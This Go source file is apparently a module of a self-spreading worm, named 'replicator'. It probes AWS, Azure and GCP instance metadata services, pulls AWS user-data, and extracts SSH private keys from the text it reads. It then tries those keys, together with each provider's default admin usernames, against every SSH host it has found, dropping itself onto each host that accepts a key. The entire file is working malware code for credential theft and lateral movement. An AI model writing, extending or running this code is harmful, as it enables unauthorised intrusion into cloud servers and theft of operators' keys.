package replicator

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
	"time"
)

// Cloud metadata key spray.
//
// On cloud instances (AWS/Azure/GCP) the worm pulls provider-specific hints
// from the instance metadata service - user-data frequently contains the SSH
// keys an operator used to provision the fleet - and sprays those keys at
// every known SSH host using the provider's default admin usernames. Pure Go,
// no external tooling. IMDS endpoints are only probed when there is already a
// set of SSH hosts and keys to spray, so bare-metal boxes never touch the
// metadata service.

const imdsTimeout = 2 * time.Second

func httpRequest(method, url, headerName, headerVal string) (string, error) {
	client := &http.Client{Timeout: imdsTimeout}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return "", err
	}
	if headerName != "" {
		req.Header.Set(headerName, headerVal)
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func awsIMDSToken() string {
	tok, err := httpRequest(http.MethodPut, "http://169.254.169.254/latest/api/token",
		"X-aws-ec2-metadata-token-ttl-seconds", "60")
	if err != nil || tok == "" {
		return ""
	}
	return tok
}

// detectCloudProvider identifies the hosting provider via its IMDS endpoint.
func detectCloudProvider() string {
	if tok := awsIMDSToken(); tok != "" {
		return "aws"
	}
	if _, err := httpRequest(http.MethodGet, "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Metadata", "true"); err == nil {
		return "azure"
	}
	if _, err := httpRequest(http.MethodGet, "http://metadata.google.internal/computeMetadata/v1/project/project-id", "Metadata-Flavor", "Google"); err == nil {
		return "gcp"
	}
	return ""
}

// fetchAWSUserData pulls IMDSv2 user-data (may embed provisioning SSH keys).
func fetchAWSUserData(tok string) string {
	ud, err := httpRequest(http.MethodGet, "http://169.254.169.254/latest/user-data",
		"X-aws-ec2-metadata-token", tok)
	if err != nil {
		return ""
	}
	return ud
}

// extractSSHPrivateKeys pulls PEM private-key blocks out of arbitrary text
// (user-data, logs, configs).
func extractSSHPrivateKeys(text string) []string {
	var keys []string
	low := strings.ToLower(text)
	for _, marker := range []string{"openssh", "rsa", "ecdsa", "ed25519", "dsa"} {
		begin := "-----begin " + marker + " private key-----"
		endMark := "-----end " + marker + " private key-----"
		idx := 0
		for {
			s := strings.Index(low[idx:], begin)
			if s == -1 {
				break
			}
			s += idx
			e := strings.Index(low[s:], endMark)
			if e == -1 {
				break
			}
			e += s + len(endMark)
			keys = append(keys, text[s:e])
			idx = e
		}
	}
	return keys
}

// cloudDefaultUsers returns default admin usernames per provider.
func cloudDefaultUsers(provider string) []string {
	switch provider {
	case "aws":
		return []string{"ec2-user", "ubuntu", "admin", "centos"}
	case "azure":
		return []string{"azureuser", "root", "ubuntu", "admin"}
	case "gcp":
		return []string{"root", "ubuntu", "admin"}
	default:
		return []string{"root", "ubuntu", "admin", "ec2-user", "azureuser"}
	}
}

// tryCloudSpray spreads with cloud-harvested keys + provider default users.
func (r *Replicator) tryCloudSpray() bool {
	// Only bother probing metadata when we already have somewhere to go.
	hosts := discoverSSHHosts()
	if len(hosts) == 0 {
		return false
	}
	keys := harvestSSHKeys()
	provider := detectCloudProvider()
	if provider == "" {
		return false
	}
	if provider == "aws" {
		if tok := awsIMDSToken(); tok != "" {
			if ud := fetchAWSUserData(tok); ud != "" {
				keys = append(keys, extractSSHPrivateKeys(ud)...)
			}
		}
	}
	if len(keys) == 0 {
		return false
	}
	log.Printf("[replicator] cloud provider detected: %s", provider)

	spread := false
	users := cloudDefaultUsers(provider)
	for _, host := range hosts {
		select {
		case <-r.done:
			return spread
		default:
		}
		for _, u := range users {
			for _, k := range keys {
				auths, err := keyAuths(k)
				if err != nil {
					continue
				}
				if _, err := r.nativeDrop(host, u, auths); err == nil {
					log.Printf("[replicator] cloud ssh-key spread to %s@%s", u, host)
					r.results <- SpreadResult{Method: "cloud-ssh-key", Target: host, Success: true,
						Output: fmt.Sprintf("provider=%s user=%s", provider, u)}
					spread = true
					break
				}
			}
			if spread {
				break
			}
		}
	}
	return spread
}
